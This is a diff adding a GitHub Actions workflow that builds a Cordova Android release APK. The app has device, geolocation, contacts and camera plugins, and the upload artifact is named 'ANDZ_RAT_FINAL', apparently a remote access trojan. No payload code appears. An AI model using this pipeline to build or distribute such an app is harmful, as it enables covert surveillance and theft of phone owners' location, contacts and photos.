@@ -1,0 +1,30 @@
+name: ANDZ_AUTO_BUILDER
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/setup-node@v3
+        with:
+          node-version: '16'
+      - uses: actions/setup-java@v3
+        with:
+          distribution: 'temurin'
+          java-version: '11'
+      - name: Install Cordova
+        run: npm install -g cordova
+      - name: Build APK
+        run: |
+          cordova platform add android
+          cordova plugin add cordova-plugin-device
+          cordova plugin add cordova-plugin-geolocation
+          cordova plugin add cordova-plugin-contacts
+          cordova plugin add cordova-plugin-camera
+          cordova plugin add cordova-plugin-flashlight
+          cordova build android --release
+      - name: Upload APK
+        uses: actions/upload-artifact@v3
+        with:
+          name: ANDZ_RAT_FINAL
+          path: platforms/android/app/build/outputs/apk/release/*.apk
